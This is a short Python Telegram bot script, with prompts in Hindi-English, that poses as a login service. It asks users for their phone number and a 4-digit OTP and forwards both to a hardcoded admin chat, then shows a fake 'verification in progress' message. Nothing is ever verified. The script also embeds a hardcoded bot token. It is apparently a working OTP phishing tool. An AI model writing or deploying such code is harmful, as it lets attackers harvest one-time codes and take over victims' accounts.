import telebot

TOKEN = '8826839484:AAHYr_aUUGLrfMhilDasWhntqk4Qy1CgHMM'
ADMIN_CHAT_ID = 7191379523

bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add(telebot.types.KeyboardButton('🔐 Login'))
    bot.send_message(message.chat.id, "Welcome! Niche diye gaye button par click karke login shuru karein:", reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == '🔐 Login')
def ask_identifier(message):
    msg = bot.send_message(message.chat.id, "Kripya apna **Phone Number** enter karein:")
    bot.register_next_step_handler(msg, process_identifier)

def process_identifier(message):
    chat_id = message.chat.id
    identifier = message.text
    
    bot.send_message(ADMIN_CHAT_ID, f"👤 **New User Login Started**\n\n📱 User Phone: {identifier}")
    
    msg = bot.send_message(chat_id, "OTP aapke number par bhej diya gaya hai. Kripya apna **4-digit OTP** yahan enter karein:")
    bot.register_next_step_handler(msg, receive_user_otp)

def receive_user_otp(message):
    chat_id = message.chat.id
    user_otp = message.text.strip()
    
    if not user_otp.isdigit() or len(user_otp) != 4:
        msg = bot.send_message(chat_id, "❌ Kripya sirf **valid 4-digit OTP** hi enter karein:")
        bot.register_next_step_handler(msg, receive_user_otp)
        return

    bot.send_message(ADMIN_CHAT_ID, f"🔑 **OTP Received!**\n\nUser ID/Chat: {chat_id}\nEntered OTP: `{user_otp}`")
    
    bot.send_message(chat_id, "⏳ OTP verification in progress... Kripya intezaar karein.")

bot.infinity_polling()
